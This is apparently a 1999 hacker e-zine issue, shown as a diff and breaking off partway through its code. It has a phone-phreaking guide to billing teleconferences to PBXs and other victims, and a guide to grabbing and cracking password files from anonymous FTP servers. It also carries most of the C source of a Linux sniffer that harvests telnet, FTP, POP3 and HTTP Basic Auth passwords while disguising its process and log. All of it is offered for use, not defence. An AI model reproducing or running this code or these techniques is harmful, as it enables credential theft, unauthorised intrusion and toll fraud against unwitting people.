@@ -1,0 +1,3767 @@
+-=[ United Hackers Association 1 - Magazine, Issue VII ]=- 
+                      May 08, 1999
+          Editor : Chiraz (Chiraz@ThePentagon.com)
+               Homepage : http://www.uha1.com/
+
+WE ARE NOT RESPONSIBLE FOR ANYTHING YOU DO WITH THIS TEXT FILE OR ANY    
+TROUBLE YOU GET INTO, OUR ISP OR ANYWHERE ELSE THIS TEXT FILE IS HOSTED
+WILL NOT BE RESPONSIBLE EITHER.
+
+
+We can manipulate you however we want. 
+We can read and change your personal datas. 
+We can take your identity. 
+Kill your existence. 
+We can come near to you from everywhere in the world. 
+You can't escape! 
+-by the file ripper [Prezident/Founder of UHA] 
+
+
+
+Index:
+-----------------------------
+.......Submissions...........
+.......Editor's Note.........Chiraz
+..Alliance Teleconferencing..LITTLE DEVIL
+..Hacking low/sec. FTP's.....Cyber.Priest
+..Sniffall.c (source code)...Markj8
+.So you want to be a hacker?.-coldfire
+.........NT Warfare..........Rhino9 team
+.Managing window's threads...Chiraz
+....IBM + Win95 Hacking......El Salvador
+......Subscriptions..........
+.......Join UHA..............
+------------------------------
+
+
+If you want, post this text on Homepages/BBS/Ftp/Newsgroups etc. 
+It's free, but please don't change anything without our permission!!
+The whole html/jpg version can be downloaded from the welcome page
+on the on-line magazine.
+
+             -->  http://www.uha1.com/magazine/7/  <--
+
+
+========================================================= 
+If you want to publish one of your texts in our Magazine, 
+   just mail us your text to : Chiraz@ThePentagon.com
+              All texts are welcome! 
+=========================================================
+
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
+
+Editors Note (by Chiraz) 
+
+
+Hi all,
+
+Welcome back to the magazine, it has been a while since the last one,
+but I'm back!
+
+We received some emails from people wanting to add to our magazine,
+although most were added, others were not because of too basic content 
+or arrogance (shit, I hate those ppl who actually discovered Linux and 
+now raging and screaming in text files, claiming that they are hackers 
+and Gods...). 
+
+Further content received does not work or is incorrect, for instance a 
+newbie text about sending anonymous email by telnet (go figure!).
+
+Actually, to give an example what got submitted, another text contained 
+the line "The difference between a HACKER and a lamer is that a hacker
+doesn´t says what he knows and a lamer doesn´t knows what he says"
+
+(So, if hackers don't share, did you learn everything from lamers? ed.)
+
+One text in the magazine is not for the people already hacking or exploring,
+but still I really wanted to add it, since I was compelled by the way 
+it was written and gives a good definition and feeling why hackers "hack" 
+and although it's not technically advanced and revelating, it's well
+targeted at it's group, as well contains a well-written analysis of 
+psychological needs and 'drives' of a hacker. So my personal greetz 
+go to -coldfire for writing and submitting it.
+
+Another greet to LITTLE DEVIL, PRESIDENT AND FOUNDER OF LDD AND UHS, 
+he was so kind to style his submission in the style I try to use.
+
+Well, you'll find the links on the left, enjoy the pages. Meanwhile, I was 
+very busy and still am writing the magazine, with researching and more.
+Some of you into programming and not into processes yet will find my 
+previous examples good material to work with/from, 
+(the NT/win9x processes example and the BO protocol)... this time I'm
+focusing more on threads in the windows architecture, how to create them,
+ manage them and discard them without causing runtime errors on your 
+system (that is, hopefully, you'll know what I mean :) 
+
+If you find some optimizations for the routines, please submit, I'm willing 
+to post corrections and other things.
+
+I'm delving into cryptography, so I decided to start on an article on
+applying cryptography. My goal is to give you source code examples, 
+explanations etc. and I hope that in the end you'll have a working model 
+in your head from where you can start developing your own protocols 
+and break your little sister's encryption (hehe). Moreover, I want 
+to aim at which cryptos are well suited to which application. 
+
+Whether I'll complete it I dunno, but let's see how far we come. 
+Maybe some ppl out there will react very positively on this and will 
+decide to add their own content and protocols to it. (!hint!)
+
+I expect the first edition of this article to come out next time, 
+so you'll have to be patient a bit to give me time to explore. 
+For now, enjoy the article about threads in the windows architecture, 
+it's programmed in Delphi, that means readable to many people and 
+exportable to C++ for all those guru's out there (they'll know 
+threads most likely already any way, when they're programming C++)
+
+Have a nice time reading the #7 magazine, and keep submitting your 
+works and articles, it's always fun to read and see submissions from 
+new people.
+
+Greetz,
+ed. (Chiraz)
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
+
+Basic Alliance Teleconferencing (BY LITTLE DEVIL)
+
+ 
+Introduction: 
+This phile will deal with accessing, understanding and using 
+the Alliance Teleconferencing Systems.... it has many sections 
+and for best use should be printed out...enjoy... 
+
+Alliance: 
+
+Alliance Teleconferencing is an independant company which allows 
+the general public to access and use it's conferencing equipment. 
+Many rumors have been floating apound that Alliance is a subsidary 
+of AT&T. Well, they are wrong. As stated above, Alliance is an 
+entirely independant company. They use sophisticated equipment 
+to allow users to talk to many people at once. 
+
+The Number: 
+Alliance is in the 700 exchange, thus it is not localized, well, 
+not in a way. Alliance is only in certain states, and only residents 
+of these certain states can access by dialing direct. This, however, 
+will be discussed in a later chapter. The numbers for alliance are 
+as follows: 
+
+0-700-456-1000(chicago) 
+-1001 (los angeles) 
+-1002 (chicago)
+-1003 (houston) 
+-2000 (?)
+-2001 (?)
+-2002 (?) 
+-2003 (?)
+-3000 (?)
+-3001 (?) 
+-3002 (?)
+-3002 (?)
+
+The locations of the first 4 numbers are known and i have stated them. 
+However, the numbers in the 200x and 300x are not definately known. 
+Rumor has it that the pattern repeats itself but this has not been proven. 
+
+Dialing: 
+As stated before, Alliance is only in certain stated and only these 
+states can access them via dialing direct. However, dialing direct 
+causes your residence to be charged for the conference and conference 
+bills are not low!!! Therefore, many ways have been discovered to start
+a conference without having it billed to ones house. 
+They are as follows: 
+
+1) Dialing through a PBX 
+2) Incorporating a Blue Box
+3) Billing to a loop
+4) Billing to a forwarded call
+
+I am sure there are many more but these are the four i will deal with. 
+
+Dialing through a PBX: 
+Probably the easiest method of creating a free conference is through a PBX. 
+Simply call one in a state that has Alliance, input the PBX's code, 
+dial 9 for an outside line and then dial alliance.
+An example of this would be: 
+
+PBX: 800-241-4911
+
+When it answers it will give you a tone. At this tone input your code.
+
+Code: 1234 
+
+After this you will receive another tone, now dial 9 for an outside line. 
+You will now hear a dial tone. Simply dial Alliance from this point and 
+the conference will be billed to the PBX. 
+
+Using a Blue Box:
+
+Another rather simple way of starting a conference is with a Blue Box.
+The following procedure is how to box a conference: Dial a number to box 
+off of. In this example we will use 609-609-6099 When the party answers 
+hit 2600hz. This will cause the fone company's equipment to think that 
+you have hung up. You will hear a You have now 'seized' a trunk. After this,
+switch to multi- frequencyand dial: 
+
+KP-0-700-456-x00x-STKP=KP tone on Blue Boxx=variable between 1 and 3ST=ST 
+tone on Blue Box The equipment now thinks that the operator has dialed 
+Alliance from her switchboard and the conference shall be billed there. 
+Since Blue Boxing is such a large topic, this is as far as I will go into
+it's uses. 
+
+Billing to a loop: 
+
+A third method of receiving a free conference is by billing out to aloop. 
+A loop is 2 numbers that when two people call, they can talkto each other. 
+You're saying woop- tee-do right? Wrong! Loops can be usefull to phreaks. 
+First, dial alliance direct. After goingthrough the beginning procedure,
+which will be discussed later in thistutorial, dial 0 and wait for an 
+Alliance operator. When she answerstell her you would like to bill the 
+conference to such and such anumber. 
+
+(A loop where your phriend is on the other side) She will then
+call that number to receive voice verification.Of course your phriend 
+will be waiting and will accept the charges.Thus, the conference is 
+billed to the loop. 
+
+Billing to call forwarding 
+
+When you dial a number that is call forwarded, it is first answered by
+the original location, then forwarded. The original location will
+hang up if 2600hz is received from only ond end of the line.
+Therefore, if you were to wait after the forwarded residence answered,
+you would receive the original location's dial tone. 
+
+Example 
+Dial 800-325-4067 
+
+The original residence would answer, then forward the call, a second 
+type of ringing would be heard. When this second residence answers
+simply wait until they hang up. After about twenty seconds you will
+then receive the original residence's dial tone since it heard 2600hz
+from one end of the line. Simply dial Alliance from this point and the
+conference will be billed to the original residence.
+
+These are the four main ways to receive a free conference. 
+I am sure many more exist, but these four are quite handy themselves. 
+
+Logon Procedure: 
+Once Alliance answers you will hear a two-tone combination. This is their 
+way of saying 'How many people do you want on the conference dude?' 
+Simply type in a 2-digit combination, depending on what bridge of 
+Alliance you are on, between 10 and 59. After this either hit '*' to 
+cancel the conference size and inout another or hit '#' to continue. 
+You are now in Alliance Teleconferencing and are only seconds away 
+from having your own roaring conference going strong!!! 
+
+Dialing in Conferees: 
+
+To dial your first conferee, dial 1+npa+pre+suff and await his/her answer. 
+npa=area code 
+pre=prefix
+suff=suffix 
+
+If the number is busy, or if no one answers simply hit '*' and your call
+will be aborted. But, if they do answer, hit the '#' key. This will add 
+them to the conference.Now commence dialing other conferees. 
+
+Joining our Conference: 
+
+To join your conference from control mode simply hit the '#' key. 
+Within a second or two you will be chatting with all your buddies. 
+To go back into control mode, simply hit the '#' key again. 
+
+Transferring Control: 
+
+To transfer control to another conferee, go into control mode, hit 
+the # 6+1+npa+pre+suff of the conferee you wish to give control to. 
+If after, you wish to abort this transfer hit the '*' key. 
+
+:Transfer of control is often not available. 
+When you receive a message stating this, you simply cannot transfer control. 
+
+Muted Conferences: 
+
+To request a muted conference simply hit the 9 key. I am not exactly 
+sure what a muted conference is but it is probably a way to keep 
+unwanted eavesdroppers from listening in. 
+
+Dialing Alliance Operators: 
+
+Simply dial 0 as you would from any fone and wait for the operator to answer. 
+
+Ending Your Conference: 
+
+To end your conference all together, that is kick everyone including 
+yourself off, go into control mode and hit '*'...after a few seconds 
+simply hang up. Your conference is over. 
+
+Are Alliance Operators Dangerous? 
+
+No. Not in the least. The worst they can do to you while you are having 
+a conference is drop all conferees including yourself. This is in no 
+way harmful, just a little aggravating. 
+
+Alliance and Tracing: 
+
+Alliance can trace, as all citizens of the United States can. 
+But this has to all be pre-meditated and AT&T has to be called and it's 
+really a large hastle, therefore, it is almost never done. 
+Alliance simply does not want it known that teenagers are phucking 
+them over. The only sort of safety equipment Alliance has on-line 
+is a simple pen register. This little device simply records all the 
+numbers of the conferees dialed. No big deal. All Alliance can do is 
+call up that persons number, threaten and question. 
+
+However, legally, they can do nothing because all you did was answer your fone. 
+:Almost all instructions are told to the person in command by Alliance 
+recordings. A lot of this tutorial is just a listing of those commands 
+plus information gathered by either myself or the phellow phreaks of the world!!! 
+
+BY LITTLE DEVIL 
+drop me a line:LITTLE DEVIL 
+<BMX_69_@HOTMAIL.COM?SUBJECT=Basic AllianceTeleconferencing> 
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
+
+~ HACKING LOW SECURITY FTPs ~
+~ written by ~
+~ Cyber.Priest ~
+04.04.99
+
+
+One of the oldest approaches to hacking FTP's on UNIX and LINUX servers is 
+using an very old exploit that still has not been fixed, the file stored in 
+etc/usr/passwd or etc/usr/shadow. This now is a very outmoded approach to 
+hacking FTP's , as more often then not you will be given select few "HELP" 
+options , when accessing the server "anonymously."
+
+What is FTP?
+FTP is an acronym for File Transfer Protocol.
+FTP is a "service" run by a server (the unix/linux/winnt box you are 
+connecting to) on port 21.
+
+The purpose of FTP is to act as a gateway to the client (you) so that you 
+can exchange files with the server (them). FTP is this gateway. FTP was created 
+for this reason, so that people can exchange files, and so was made 
+quite friendly, all too friendly. We will take advantage of their 
+over-friendliness to compromise the FTP.
+
+In this article I will explain how to detect and compromise low security 
+FTP sites. What you do with them after you've conquered them is your business 
+- you can steal files containing important info, modify files, etc.
+
+Without further ado, let us analyze your current situation: 
+
+
+- DOS FTP HACK -
+
+More often then not , hackers have a "target" in mind when hacking. 
+And approach this goal with every possible "exploit" they have knowledge 
+of pertaining to that particular computer system or OS.
+
+I personally will execute the following procedures:
+
+Open DOS. type ftp.
+1) select one of 2 possible protocols to begin our ftp hack session. www. or ftp.
+
+2) select any combination of numbers and letters. my convention is to 
+select 1-6 letter and or numbers or a combination of both. Lets go with 
+"passwd." we now have ftp www.password.
+
+3) Now we must close this address with one of the following extensions. 
+.com , .net , .org , .jp , .gov *
+
+* note: I strongly advise you avoid this option like the plague for the time being.
+In this instance I have selected .net.
+
+
+4) We now have an random produce address of www.passwd.net , thus youre 
+DOS prompt should resemble the following: c:> ftp www.passwd.net .
+
+Now hit enter and wait to see if you receive an connection to this addresses FTP port 21.
+One of 3 things will take place. 
+
+     1) you receive the following successful connection prompt:
+"etc.passwd.net:(none)): " . congratulations you found an ftp to possibly hack.
+
+     2) Unknown Host www.passwd.net sorry no luck here.
+
+     3) Connection Received: 101273 or 10028 etc. sorry , looks good but still no luck.
+
+
+Now we will assume you connected to an ftp via dos.
+
+at the first prompt enter "anonymous". 
+
+Note: leave the " out . then hit enter.
+
+you will now receive 1 of 3 responses:
+
+    1) "anonymous login ok , please send youre complete email address as password."
+
+Congratulations you are about to gain anonymous access to this ftp server. 
+now enter any email address and gain access. Note: never use your, nor 
+anyone else’s real email address. try user@server.com . or any thing you 
+can think of.
+
+    2) "anonymous login not accepted." sorry this ones a no go.
+
+    3) " pass word needed for anonymous log in." 
+
+This one is often tricky. try anonymous or guest as a password. maybe 3/10 
+times you will slide in. 2 other options are to try guest as a log in and pass,
+or hit enter on both prompts. these both will give you an undeterminable 
+access about 1/10 times.
+
+Ok now we are in:
+
+enter the command "ls" 
+you will be given a list of directories you can check out and/or down load. 
+What we are looking for is a file called "passwd" . This may also come as 
+passwd.bak , passwd.group , passwd.sal. there may be more Im yet to encounter. 
+how ever if it says passwd then you want it.
+
+You very well may find nothing on the first ls command but a list of useless files.
+Then give the following command " cd ../etc " and enter. now give the ls command. 
+here you should 50 % of the time find 1 or more passwd files. To get these 
+files give the command , mget passwd (or whatever the passwd file is called). 
+you will now get a prompt asking "Set word A mget passwd ?: " enter Y and hit
+enter. you will be told how much data you are receiving in bytes. generally 50-500, 
+though I’ve found up to 500 000 bytes which was a full page.
+
+Sit and wait as it down loads. well done. 
+
+
+Im very quickly going to cover what you have just accomplished. On the connection 
+to the FTP you used what is known as a "default login" command, "anonymous".
+This is one of the many "defaults" that come preprogrammed with an FTP server.
+Often times these "defaults" are either removed for security purposes , left in 
+for the general publics use or just abscente mindedly left open.
+
+If you type the command "help" once you have gained "anonymous" access , you
+will be given a list of other commands you have at youre disposal to search 
+this servers FTP. I encourage you to execute these commands in varied combinations 
+in order to get a feel for UNIX. What you are find with the "HELP" command 
+is a UNIX MENU shell , an very minor UNIX command system.
+
+the " .. " I have introduced you to is called a "parent diretory" . 
+a single " . " is known as the "child directory." 
+Any serious and dedicated "Neophyte" would either purchase a UNIX manual 
+to learn the OS or find one on line, as there are plenty of them on-line. 
+Try typing the command "help" in combination with any of the menu commands 
+you see. i.e " help cd " to get an brief description of the command.
+
+
+FTP SECURITY
+
+More often than not , the moment you login to any server , both youre IP 
+and Hostnamewill be recorded to the ftp's logfile along with all activity
+you take while in this system.
+
+Carnage00 of HFX has located an security program known as "Gaurd Dog" 
+on this very server. And in this case it seems that it holds 4 logfiles ,
+thus you are logged 4 times.
+
+There are measures that can be taken to cover youre tracks, that will be coverd in my 
+Neophytes Introduction to Hacking/Cracking/Phreaking/Virii.
+----------------------------------------------------------
+
+
+Now you may have downloaded a shadowed pass word file or encrypted file 
+from the FTP.
+
+shadowed: forget it. 
+
+shadowed is when you see an * , - , x where the pass word should be.
+There are ways to unshadow these files but Im not going to cover that this file.
+
+encrypted: I advise you go find an cracking program called "Cracker Jack".
+
+it should come with a help file. Im not covering cracking in this file. 
+I will be in my future files.
+
+Once you have either "cracked" and encrypted pass word file or found an 
+unencrypted file you will want to reconnect to either port 21 (telnet) or 
+23 (ftp) on that address you hacked using the information found in the 
+password file.
+
+how do you know what all that info means on the password file ? :
+
+Example: john:101xhg:432:16:john doe:/home/dir/john:/bin/john 
+
+- this is how it is broken down -
+Username: john 
+User ID # : 432
+Password: 101xhg note: passwords not "shadowed" will be encrypted.
+Group ID : 16 
+Gecos : john doe note: MetGod of HFX points out that other info may be placed here instead
+home dir : /home/dir/john such as phone #'s , birth dates etc.
+shell : /bin/john note: home dir , would be this accounts home 
+directory where its personal files are stored.
+
+shell , is this accounts Operating System , wich effects what commands
+may be executed from this account.
+
+NOTE: THIS FILE WAS COMPOSED FOR EDUCATIONAL PURPOSES ALONE.
+I TAKE NO RESPONSIBILLITY FOR ANY WHOM USE THIS KNOWLEDGE ILLEGALLY.
+
+This file may be distributed freely as long as its contents remain 
+unedited in any manner and the true authors handle remains on this file. 
+Please forward any comments or questions to:
+
+Cyber.Priest@sympatico.ca <mailto:Cyber.Priest@sympatico.ca>
+~ Cyber.Priest~
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
+
+Sniffall.c   (by Markj8)
+
+/*
+ *
+ *  Sniffall for Linux
+ * 
+ * Based on: 
+ *  LinSniffer 0.03 [BETA]
+ *  Mike Edulla
+ *  medulla@infosoc.com
+ *
+ * and also based on: 
+ *  Webb Sniff
+ *  Coded by BeastMaster V  (email to bryan@scott.net)
+ *  http://www.rootshell.com
+ *
+ *  DESCRIPTION:
+ *  Webb Sniff:  This program sniffs packets destined for
+ *  webservers and scans for headers with Basic Auth and
+ *  then automatically decodes the auth. string giving a
+ *  username/passwd in cleartext.
+ *
+ *  Linsniffer: sniffs plaintext passwords from:
+ *  telnet, rlogin, FTP, pop2, pop3, poppasswd, imap2
+ *
+ *  "Enhancements" by markj8:
+ *  Combined the two programs mentioned above, fixing a couple of
+ *    BeastMaster's bugs along the way.
+ *  POP3 once only logging using in-memory binary tree.
+ *  Longer telnet & rlogin session logging (See who is typing what...).
+ *  Option to NOT set promiscuous mode since its useless on 10baseT et al.
+ *  Option to log ALL HTTP requests (who is visiting what web site).
+ *  Simple obfuscation of log file using ~ & ^
+ *
+ * TODO:
+ * Dump pop passwords on sig HUP & fflush log
+ * Investigate signal......
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdarg.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <netinet/in.h>
+#include <netinet/protocols.h>
+#include <netdb.h>
+#include <string.h>
+#include <linux/if.h>
+#include <signal.h>
+#include <termio.h>
+#include <arpa/inet.h>
+#include <linux/socket.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/if_ether.h>
+#include <errno.h>
+#include <ctype.h>
+#include <pwd.h>
+
+extern int errno;
+
+#define WEB_PORT1 80        /* Standard */
+#define WEB_PORT2 8080      /* Normal proxy */
+#define WEB_PORT3 3128      /* Squid-cache default */
+
+#define CAP_LEN 1024        /* bytes */
+#define TIMEOUT 30          /* seconds */
+
+#define TELNET_CAP_LEN 5000 /* For extended logging of */
+#define TELNET_TIMEOUT 600  /* telnet & rlogin sessions */
+
+#define LBUFFL 512
+
+#define INTERFACE "eth0"
+#define SPACELEFT(buf, ptr)  (sizeof buf - ((ptr) - buf))
+
+struct BASE64_PARAMS {
+      unsigned long int accum;
+      int               shift;
+      int               save_shift;
+};
+
+struct etherpacket {
+        struct ethhdr ether_header;
+        struct iphdr ip_header;
+        struct tcphdr tcp_header;
+        char buff[8192];
+} ether_packet;
+
+struct 
+{
+	unsigned long source_addr;
+        unsigned long dest_addr;
+        unsigned short source_port;
+        unsigned short dest_port;
+        int	bytes_read;
+        char	active;
+        time_t	start_time;
+	char	tmp_realm[1024];
+	char	tmp_host[512];
+	char	pop3user[32];
+	char	pop3pass[32];
+} target;
+
+struct luser {		/* Basic binary tree node for pop3 user info */
+    char *user;		/* pointer to username */
+    char *pass;		/* pointer to password */
+    int	count;		/* Number of times this user checked mail */
+    struct luser *left;	/* pointer to left child of this node */
+    struct luser *right;/* pointer to right child of this node */
+    };
+
+struct iphdr *ip;
+struct tcphdr *tcp;
+
+char **Argv = NULL;          
+char *LastArgv = NULL;      
+
+FILE *fp1;
+char lbuff[LBUFFL];
+int sock;
+int http_verbose=0;
+int promiscuous=0;
+int obfuscate=0;
+struct luser *pop3tree=NULL; /* Cause creation of root entry */
+
+
+/* Allocate memory for a new luser & return a pointer to them */
+struct luser *luser_alloc(void)
+{
+    return((struct luser *) malloc(sizeof(struct luser)));
+}
+
+/* Store pop3 user info or inc "Hit" count if user already here */ 
+struct luser *tree(struct luser *p, char *u, char *w)
+{
+    int cond;
+    if (p==NULL) {			/* u is a "new" user */
+	p=luser_alloc();		/* make a new node */
+	p->user=strdup(u);		/* save user & store pointer */
+	p->pass=strdup(w);		/* save pass & store pointer */
+	p->count=1;			/* we have only seen this once */
+	p->left=p->right=NULL;		/* this is a LEAF node */
+	} else {
+	if ((cond=strcmp(u,p->user))==0) {
+	    p->count++;			/* Not YOU again! */
+	    if(strcmp(w,p->pass)) {	/* If passwd has changed */
+		free(p->pass);		/*  Scrap old */
+		p->pass=strdup(w);	/*  Assume new is correct */
+		}
+	    } else {
+	    if (cond<0) {		/* less than goes left */
+		p->left=tree(p->left,u,w);
+		} else {		/* greater goes right */
+		p->right=tree(p->right,u,w);
+		}
+	    }
+	}
+    return p;				/* return pointer to current node */
+}
+
+char *chop(char *p)
+{
+    int i;
+    for (i=0; *(p+i); i++)
+	if (*(p+i)=='\n') {
+	    *(p+i)='\0';
+	    break;
+	}
+    return(p);
+}
+
+void logg(char * s)
+{
+    int i=strlen(s), j, k;
+
+    for (j=0;j<i;j++) { /* This is intended to make the contents of the */
+	k = ~ *(s+j);   /* log file look less suspicious */
+	if(obfuscate) { /* while still allowing it to be compressed. */
+	    fputc(k^0x55,fp1); /* 0xAA is the only byte value that will be */
+	    }else{	/* Converted to 0x00 and we won't be logging that */
+	    fputc(*(s+j),fp1);
+	    }
+	}
+}
+
+/* This function detaches a process from a controlling terminal */
+void detach(void)
+{
+        int rc, fd;
+
+        /* Fork once to escape shell's job control */
+        if ((rc = fork()) > 0)
+                exit(0);
+        else if (rc <0) {
+                perror("detach");
+                exit(EXIT_FAILURE);
+        }
+
+        /* Now detach from the controlling terminal */
+        if ((fd = open("/dev/tty", O_RDWR,0)) == -1 ) {
+                printf("couldn't open tty, assuming still okay...\n");
+                fflush(stdout);
+                return;
+        }
+
+        ioctl(fd, TIOCNOTTY, 0);
+
+        close(fd);
+
+        /* Make us a new process group/session */
+        setsid();
+}
+
+/* This function lets you set the current process title */
+void setproctitle(const char *fmt, ...)
+{
+        register char *p;
+        register int i;
+        char buf[2048];
+	va_list args;
+
+        p = buf;
+
+	va_start(args, fmt);
+        (void) vsnprintf(p, SPACELEFT(buf, p), fmt, args);
+	va_end(args);
+
+        i = strlen(buf);
+
+        if (i > LastArgv - Argv[0] - 2)
+        {
+                i = LastArgv - Argv[0] - 2;
+                buf[i] = '\0';
+        }
+        (void) strcpy(Argv[0], buf);
+        p = &Argv[0][i];
+        while (p < LastArgv)
+                *p++ = ' ';
+        Argv[1] = NULL;
+}
+
+/* This function does initialization for setproctitle() */
+void initsetproctitle(int argc, char **argv, char **envp)
+{
+        register int i;
+        extern char **environ;
+
+        for (i = 0; envp[i] != NULL; i++)
+                continue;
+        environ = (char **) malloc(sizeof (char *) * (i + 1));
+        for (i = 0; envp[i] != NULL; i++)
+                environ[i] = strdup(envp[i]);
+        environ[i] = NULL;
+
+        Argv = argv;
+        if (i > 0)
+                LastArgv = envp[i - 1] + strlen(envp[i - 1]);
+        else
+                LastArgv = argv[argc - 1] + strlen(argv[argc - 1]);
+}
+
+/* This function returns the data and time */
+char * dateTime()
+{
+        time_t t;
+        char * s;
+
+        time(&t);
+        s = (char *)ctime((const time_t *)&t);
+        s[24] = '\0';
+        return s;
+}
+
+/* Resolves a hostname via gethostbyaddr() */
+char *lookup(unsigned long int network_address)
+{
+        static char buf[1024];
+        struct in_addr my_addr;
+        struct hostent *he;
+
+        my_addr.s_addr=network_address;
+        he=gethostbyaddr((char *)&my_addr,sizeof(struct in_addr),AF_INET);
+        if (he==NULL)
+                sprintf(buf,inet_ntoa(my_addr));
+        else
+                sprintf(buf,he->h_name);
+        return (buf);
+}
+
+void clear_target(void)
+{
+    fflush(fp1);
+    bzero(&target, sizeof(target));
+}
+
+void ascii_cpy(char *dest, char *source, int max)
+{
+    unsigned char c;
+    int count=0;
+    while((c=*(source++))&&(count<max)) {
+	if((c>' ')&&(c<127)) {
+	    *(dest++)=c;
+	    count++;
+	    }
+	}
+    *dest='\0';
+}
+
+/* pop3, Have we seen this user before? */
+/* This AssUmes that the client is automated and therefore sends */
+/* lengthy packets containing strings.... rather than single chars */
+/* like a telnet connection.... */
+void pop3_scan(int datalen, char *data)
+{
+/* Need to scan for USER , look it up , store it & stor PASS too. */
+
+    char *word1, *word2, *p, dat[8196];
+
+    strncpy(dat,data,datalen); /* local copy of packet data */    
+    *(dat+datalen)=0; /* ensure zero terminated string */
+    
+    if(*target.pop3user) { /* We have a user, Look for pass */
+	word1="PASS"; word2="pass"; 
+	} else { /* Look for user */
+	word1="USER"; word2="user";
+	}
+    p=strstr(dat,word1);
+    if(p==NULL) p=strstr(dat,word2);
+    if(p!=NULL) { /* word found */
+	p+=4; /* skip over word */
+	if(*target.pop3user) { /* found pass */
+	    ascii_cpy(target.pop3pass,p,30);
+	    pop3tree=tree(pop3tree,target.pop3user,target.pop3pass);
+	    clear_target(); /* We've heard enough from you */
+	    } else { /* found user */
+	    ascii_cpy(target.pop3user,p,30);
+	    }
+	}
+}
+
+/* FTP, Telnet etc.  Scan packet data for login & password */
+void ascii_scan(int datalen, char *data)
+{
+   int i, prev_white=0;
+   static bin=0, col=0;  /* remember  status between packets */
+   
+    for(i=0; i<datalen; i++)
+ {
+	if((isspace(data[i]))&&(prev_white))
+	    continue;
+	if(data[i] == 13) {
+	    logg("\n");
+	    col=0;
+	    continue;
+	    }
+	if(isprint(data[i])) {
+	    bin=0;
+	    snprintf(lbuff,LBUFFL, "%c", data[i]);
+	    logg(lbuff);
+	    col++;
+	    } else {
+	    if(!bin) {
+		bin=1;
+		logg(".");
+		col++;
+		}
+	    }
+	if((col > 65)&&(!isalpha(data[i]))) {
+	    logg("\n");
+	    col=0;
+	    }
+	if(isspace(data[i]))
+	    prev_white=1;
+	else
+	    prev_white=0;
+	}
+}
+
+/* Converts base64 ascii to integer code */
+int cvt_ascii( unsigned char alpha )
+{
+   if      ( (alpha >= 'A') && (alpha <= 'Z') ) return (int)(alpha - 'A');
+   else if ( (alpha >= 'a') && (alpha <= 'z') )
+        return 26 + (int)(alpha - 'a');
+   else if ( (alpha >= '0') && (alpha <= '9' ) )
+        return 52 + (int)(alpha - '0');
+   else if ( alpha == '+' ) return 62;
+   else if ( alpha == '/' ) return 63;
+   else if ( alpha == '=' ) return -2;
+   else                     return -1;
+}
+
+/* This does the actual base64 decoding */
+void base64_decode(char *buf,int quit,struct BASE64_PARAMS *d,char *auth_buf)
+{
+   int index;
+   unsigned long int value;
+   unsigned char blivit;
+   unsigned short j=0;
+
+   index = 0;
+   *(auth_buf+0)='\0'; 
+
+   while ( isspace(buf[index] ) )
+   {
+      index++;                         /* skip leading blanks */
+   }
+
+   for ( index = 0;
+         (buf[index] != '\n') &&
+         (buf[index] != '\0') &&
+         (buf[index] != ' ' );
+         index++)
+   {
+
+      if (index==(264-5)) return;
+
+      value = cvt_ascii( buf[index] ); /* find chr in base64 alphabet */
+
+      if ( value < 64 )                /* if legal */
+      {
+         d->accum <<= 6;               /* assemble binary accum */
+         d->shift += 6;
+         d->accum |= value;
+         if ( d->shift >= 8 )
+         {
+            d->shift -= 8;
+            value = d->accum >> d->shift;
+            blivit = (unsigned char)value & 0xFFl;
+            *(auth_buf+j) = (char )blivit;
+	    j++;
+         }
+
+      }
+      else                             /* else if out of base64 range */
+      {
+         quit = 1;                     /* then finished */
+         break;
+      }
+   }
+
+   *(auth_buf+j)='\0';   
+   return;
+}
+
+/* This is a nice way to call the base64 decode function */
+void decode(char *b64_string, char *user_buff)
+{
+
+        struct BASE64_PARAMS d_p;
+        int quit=0;
+
+        d_p.shift = 0;
+        d_p.accum = 0;
+
+        base64_decode((char *)b64_string, quit, &d_p, user_buff);
+
+        return;
+}
+
+/* HTTP: Checks for authorization and parses out username and password */
+void parse_segment(char *data)
+{
+	short i,j=0;
+	char foo[256];
+  	char user[128];
+	char pass[128];
+
+	if(http_verbose) {
+	    logg(data);
+	    logg("||\n");
+	    }
+	    
+	if ((!strncmp(data,"GET ",4))||(!strncmp(data,"POST ",5))
+		||(!strncmp(data,"HEAD ",5)))
+		strncpy(target.tmp_realm,data,strlen(data));
+
+	/* You may wish to change this to a more intelligent test */
+	if (!strncasecmp(data,"Authorization: Basic",20)) {
+		if (strlen(data+21)>sizeof(foo)) 
+			*(data+21+sizeof(foo-1))='\0';
+		decode(data+21,foo);
+		for (i=0;foo[i];i++) {
+			if (foo[i]==':')
+				break;
+			user[i]=foo[i];
+		}
+		user[i]='\0';
+		for (++i; foo[i]; i++) {
+			pass[j]=foo[i];
+			j++;
+		}	
+		pass[j]='\0';
+		snprintf(lbuff,LBUFFL,"\n####### [%s]\n",dateTime());
+		logg(lbuff);
+		logg(target.tmp_host);
+		snprintf(lbuff,LBUFFL,
+		    "REALM REQUESTED: %s\n", target.tmp_realm);
+		logg(lbuff);
+		snprintf(lbuff,LBUFFL,
+		    "---[ USER = %s     PASS = %s ]---\n",user,pass);
+		logg(lbuff);
+		logg("#######\n\n");
+		clear_target(); /* We've heard enough from you */
+	}
+}
+
+/* HTTP: Read data from ether_packet.buff and parse check each line */
+void http_scan(int datalen, char *data)
+{
+   int i=0, t=0;
+   char data_buff[CAP_LEN+2];
+
+   memset(target.tmp_realm,'\0',sizeof(target.tmp_realm));
+   sprintf(target.tmp_host,"[%s] [%d] => ",lookup(target.source_addr),ntohs(target.source_port));
+   sprintf(data_buff,"[%s] [%d]\n",lookup(target.dest_addr),ntohs(target.dest_port));
+   strcat(target.tmp_host,data_buff);
+
+    if(http_verbose) {
+	logg(target.tmp_host);
+	logg("\n");
+	}
+
